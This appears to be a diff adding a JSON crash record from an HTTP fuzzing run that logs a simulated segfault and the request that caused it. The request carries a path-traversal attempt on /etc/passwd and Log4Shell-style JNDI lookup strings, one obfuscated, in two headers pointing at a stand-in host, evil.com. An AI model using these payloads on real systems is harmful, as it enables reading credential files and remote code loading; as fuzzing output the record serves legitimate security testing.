@@ -1,0 +1,22 @@
+{
+  "timestamp": "2025-12-29T14:42:11.396369",
+  "crash_type": "segfault",
+  "payload": "DELETE /..%2f..%2f..%2fetc/passwd?\nHeaders: {'User-Agent': '${jndi:ldap://evil.com/exploit}', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Host': '127.0.0.1:8080', 'Authorization': '${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/a}', 'Content-Length': '0'}",
+  "payload_hash": "9d5944a217564f75",
+  "request_method": "DELETE",
+  "request_path": "/..%2f..%2f..%2fetc/passwd?",
+  "request_headers": {
+    "User-Agent": "${jndi:ldap://evil.com/exploit}",
+    "Accept-Encoding": "gzip, deflate",
+    "Accept": "*/*",
+    "Connection": "close",
+    "Host": "127.0.0.1:8080",
+    "Authorization": "${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/a}",
+    "Content-Length": "0"
+  },
+  "request_body": "",
+  "error_message": "Simulated segfault",
+  "stack_trace": null,
+  "fuzzer_variant": null,
+  "iteration": 245
+}
